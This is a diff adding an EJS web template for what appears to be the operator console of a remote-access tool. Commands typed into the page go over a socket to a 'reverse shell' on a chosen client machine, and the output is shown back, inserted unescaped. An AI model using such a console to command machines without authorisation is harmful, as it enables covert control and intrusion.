@@ -1,0 +1,47 @@
+
+<% include ../menu_client %>
+
+<div class="row">
+  <pre class="col-sm-12 remoteShell" style="height:400px;"></pre>
+  <input type="text" name="" value="" class="form-control cmdForReverseShell" data-admin-id="<%= admin.admin_id %>" data-client-id="<%= client.client_id %>" placeholder="Enter command here and press enter :)" style="background:#000;color:#2ecc71;border:1px solid #3498db;">
+</div>
+
+<script>
+
+  function init_client_remote_shell(socket, data){
+
+    // Send cmd to reverse shell for client
+    $(".cmdForReverseShell").keypress(function(e) {
+        if(e.which == 13) {
+          var clientId = $(".cmdForReverseShell").data("client-id");
+          var adminId  = $(".cmdForReverseShell").data("admin-id");
+          var cmd      = $(".cmdForReverseShell").val();
+          socket.emit("cmdForReverseShell", clientId, adminId, cmd);
+          $(".cmdForReverseShell").val("");
+        }
+    });
+
+    // Callback reverse shell client
+    socket.on('reverseShellCallback', function (clientId, type, data) {
+      if(type == "success") var logType = "logs-info";
+      if(type == "error")   var logType = "logs-danger";
+      $(".remoteShell").append("<p class='logs-warning'>=======================================</p>");
+      $(".remoteShell").append("<p class='"+logType+"'>"+data+"</p>");
+      $('.remoteShell').scrollTop($('.remoteShell')[0].scrollHeight);
+    });
+
+    /* ---------- FRONTEND ---------- */
+
+    $.slidebars({
+    siteClose: true, // true or false
+    disableOver: false, // integer or false
+    hideControlClasses: false, // true or false
+    scrollLock: true // true or false
+    });
+
+    //$(".DataTables_scrollBody").niceScroll({cursorcolor:"#3498db"});
+    $(".remoteShell").niceScroll({cursorcolor:"#3498db"});
+
+  }
+
+</script>
